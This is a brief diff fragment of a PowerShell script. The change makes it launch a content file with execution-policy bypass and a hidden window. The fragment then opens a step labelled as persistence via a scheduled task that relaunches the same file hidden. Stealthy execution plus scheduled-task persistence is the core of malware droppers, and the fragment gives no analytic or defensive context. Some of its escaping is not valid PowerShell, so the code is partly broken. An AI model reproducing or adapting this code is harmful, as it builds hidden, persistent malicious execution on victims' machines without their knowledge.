@@ -36,7 +36,7 @@ if (Test-Path $wrapperPath) {
     exit 1
 }
 
-powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \$wrapperPath
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \$contentPath 
 
 # === Step 3: Persistence via scheduled task ===
 $taskAction = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \`"$contentPath\`""
